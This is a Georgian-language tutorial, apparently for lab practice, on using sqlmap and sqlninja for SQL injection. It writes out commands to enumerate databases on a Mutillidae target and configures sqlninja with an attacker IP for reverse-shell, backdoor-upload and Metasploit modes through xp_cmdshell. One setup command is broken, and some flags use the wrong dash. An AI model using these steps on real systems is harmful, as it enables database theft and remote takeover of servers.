SQL ინექციის შესახებ გაეცანით http://hakipedia.com/index.php/SQL_Injection

# SQLMap

ეს ხელსაწყო ახორციელებს სკანირებას, აღმოაჩენს და ახორციელებს გარკვეული URL-ზე SQL ინექციის ექსპლუატაციას.
მხარდაჭერილი მონაცემების ბაზებია: MS-SQL, MySQL, Oracle, and PostgreSQL, DB2, Informix, Sybase, InterBase, and MS-Access. SQLMap იყენებს SQL ინექციის 4 ტექნიკას:
  - Inferential blind SQL injection
  - UNION query SQL injection
  - stacked queries
  - time-based blind SQL injection.

მახ შეუძლია მონაცემების ბაზის ანაბეჭდის დადგენა, ბაზების სახელების დადგენა, მონაცემების ნახვა, პსხვერპლის ფაილურ სისტემასთან წვდომა და მსხვერპლის ოპერაციულ სისტემაში ბრძანების გაშვება. დამატებით შეუძლია Burp proxy-ს ან WebScarab-ის ლოგებით შეადგინოს მსხვერპლების. აგრეთვე შეუძლია მსხვერპლების აღმოჩენა გუგლის Google dork-ების გამოყენებით.

Google Hacking Database (GHDB): http://www.hackersforcharity.org/ghdb/

გაეცანი მისი მოხმარების დოკუმენტაციას.

```
tutashxia@kali ~> sqlmap -h
```

ტესტირება:

```
tutashxia@kali ~> sqlmap -u "http://192.168.0.30/mutillidae/index.php?page=view-someones-
blog.php" --forms --batch --dbs
```

  * –u მიუთითებს სატესტო URL-ს
  * --forms მიუთითებს მსხვერპლის ვებ გვერდზე form field-ის გამოყენებას
  * --batch მიუთითებს რომ ვებ გვერდზე form-ის დეფოლტი არჩევანი ქნას
  * --dbs მიუთითებს რომ მანაცემის ბაზების სახელები დაადგინოს.


# SQL Ninja

SQL Ninja არის SQL ინექციის განსახორციებლად მხოლოდ MS-SQL Server-ებთან.
წარმატებული SQL ინექციის შემთხევაში მას შეუძლია გაუშვას ინტერაქტიული შელი. ამისთვის იგი იყენებს სერვერის ანაბეჭდს, პაროლის გამოცნობას brute force-ით, პრივილეგიის აღმატებას, შურეული ბექდორის ატვირთვას, პირდაპირ შელს, backscan connect shell (ფაირვოლის გვერდის ავლით), reverse shell, DNS ტუნელიგს, ერთი ბრძანების გაშვევას, და Metasploit-ის ინტეგრირებას. ანუ ეს ხელსაწყო არა მარტო SQL ინექციებს ეძებს არამედ ასეთ სისტეებს ოყენებს რომ მსხვერპლის ოპერაციულ სისტემაზე წვდომა დაამყაროს.


ჯერ კონფუგურაციის ფაილის კოპიოს უნდა შეუცვალოთ სახელწოდება:

```
tutashxia@kali ~> cd /usr/share/doc/sqlninja/
tutashxia@kali ~> gzip –d sqlninja.conf.example.gz
tutashxia@kali ~> cp sqlninja.conf.example.gz /usr/share/sqlninja/sqlninja.conf
```

შემდეგ ამ კონფიგურაციის ფაილში უნდა შეიტანოთ ცვლილებები სამსვერპლო აპლიკაციის მიხედვით.
მაგალითად:

```
tutashxia@kali ~> vim sqlninja.conf
...
# Host (required)
host = 127.0.0.1
# Port (optional, default: 80)
port = 80
# Vulnerable page (e.g.: /dir/target.asp)
page = /showforum.asp
stringstart = id=0;
# Local host: your IP address (for backscan and revshell modes)
lhost = 192.168.0.3
msfpath = /usr/share/exploits/framework3
# Name of the procedure to use/create to launch commands. Default is
# "xp_cmdshell". If set to "NULL", openrowset+sp_oacreate will be used
# for each command
xp_name = xp_cmdshell
```

შემდეგ გაანხორციელე შეტაკება:

```
tutashxia@kali ~> sqlninja -m t
```

შემდეგ გაანხორციელე ანაბეჭდის დადგენა და სხვა ინფორმაციების მოპოვება MS-SQL Server-ის და ოპერაციული სისტემის შესახებ:

```
tutashxia@kali ~> sqlninja -m f
```

წარმატებული შეტაკების შემდეგ Metasploit-ით კავშირის დამყარება გატეხილ სერვერთან:

```
tutashxia@kali ~> sqlninja -m u
```

ატვირთული ბექდორის ხმარებისთვის s/dirshell , k/backscan , ან r/revshell. კიდე არის m/metasploit რომლითაც გრაფიკული ინტერფეისით მიწვდები გატეხილ სერვერს, SQL Ninja მოქმედებს როგორც Metasploit-ის შუამავალი.
დამატებითი ინფორმაციისთვის: http://sqlninja.sourceforge.net/sqlninja-howto.html .
